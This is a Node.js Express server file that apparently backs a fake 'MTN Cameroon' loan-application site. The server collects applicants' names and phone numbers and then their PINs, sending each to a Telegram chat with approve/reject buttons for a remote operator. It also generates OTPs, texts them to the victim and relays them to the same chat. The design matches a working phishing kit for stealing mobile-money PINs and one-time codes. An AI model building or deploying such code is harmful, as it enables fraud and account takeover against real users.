require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── Configuration ───
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
const SMS_DELAY_MS = 10000; // 10 seconds delay

// ─── In-Memory Store ───
const applications = {};

// ─── Helpers ───
function generateAppRef(appId) {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
}

async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    console.log('✅ Telegram message sent');
  } catch (e) {
    console.error('Telegram error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.error('❌ SMS gateway not configured');
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, {
      to,
      text
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': SMS_GATEWAY_API_KEY
      }
    });
    console.log(`✅ SMS sent to ${to}`);
  } catch (error) {
    console.error(`❌ SMS failed:`, error.message);
  }
}

// Helper to delay SMS sending by SMS_DELAY_MS
function delaySms(to, text) {
  return new Promise(resolve => {
    setTimeout(async () => {
      await sendSms(to, text);
      resolve();
    }, SMS_DELAY_MS);
  });
}

// ─── API Routes ───

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Submit application
app.post('/api/send-application', async (req, res) => {
  try {
    const data = req.body.applicationData;
    if (!data || !data.phone || !data.firstName) {
      return res.status(400).json({ ok: false, error: 'Missing required fields' });
    }

    const appId = `${data.phone}_${Date.now()}`;
    const ref = generateAppRef(appId);

    applications[appId] = {
      ...data,
      ref,
      appStatus: 'pending',
      pinStatus: 'pending',
      otpStatus: 'pending',
      pinAttempts: 0,
      maxPinAttempts: 3,
      pinBlockedUntil: null
    };

    const message = `🔵 NEW LOAN APPLICATION (CAMEROON)\nID: ${appId}\nPhone: +237${data.phone}\nAmount: XAF ${data.loanAmount}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'APP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'APP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Send PIN (for admin verification – no SMS)
app.post('/api/send-pin', async (req, res) => {
  try {
    const { applicationId, pin } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    if (app.appStatus !== 'approved') {
      return res.status(400).json({ ok: false, error: 'Application not yet approved' });
    }

    app.pin = pin;
    app.pinStatus = 'pending';

    const ref = app.ref || generateAppRef(applicationId);
    const message = `🔐 PIN VERIFICATION (CAMEROON)\nID: ${applicationId}\nPIN: ${pin}\n\nApprove or reject:`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Send OTP (generate OTP, delay 10s, send SMS with ONLY the code, notify admin)
app.post('/api/send-otp', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    if (app.pinStatus !== 'approved') {
      return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
    }

    const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
    app.otp = newOtp;
    app.otpStatus = 'pending';

    // 🔔 Notify admin immediately (as before)
    const ref = app.ref || generateAppRef(applicationId);
    const message = `🔑 OTP VERIFICATION (CAMEROON)\nID: ${applicationId}\nPhone: +237${app.phone}\nOTP: ${newOtp}\n\nApprove or reject:`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);

    // 📲 Send SMS after 10 seconds with ONLY the OTP
    const userPhone = `+237${app.phone}`;
    delaySms(userPhone, `OTP: ${newOtp}`); // fire and forget, doesn't block response

    res.json({ ok: true, status: 'pending' });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Resend OTP (same as above)
app.post('/api/resend-otp', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
    app.otp = newOtp;
    app.otpStatus = 'pending';

    // Notify admin
    const ref = app.ref || generateAppRef(applicationId);
    const message = `🔄 OTP RESENT (CAMEROON)\nID: ${applicationId}\nOTP: ${newOtp}\n\nApprove or reject:`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);

    // Send SMS after 10 seconds
    const userPhone = `+237${app.phone}`;
    delaySms(userPhone, `OTP: ${newOtp}`);

    res.json({ ok: true, status: 'otp_resent' });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Status check
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  if (req.params.step === 'app') status = app.appStatus;
  else if (req.params.step === 'pin') status = app.pinStatus;
  else if (req.params.step === 'otp') status = app.otpStatus;

  res.json({ ok: true, status });
});

// Telegram webhook (admin approval)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    let callbackData;
    try { callbackData = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }

    const { a, s, ref } = callbackData;
    const appId = Object.keys(applications).find(id => applications[id].ref === ref);
    if (!appId) return res.sendStatus(200);

    const app = applications[appId];

    if (s === 'APP') app.appStatus = a === 'YES' ? 'approved' : 'rejected';
    else if (s === 'PIN') app.pinStatus = a === 'YES' ? 'approved' : 'rejected';
    else if (s === 'OTP') app.otpStatus = a === 'YES' ? 'approved' : 'rejected';

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
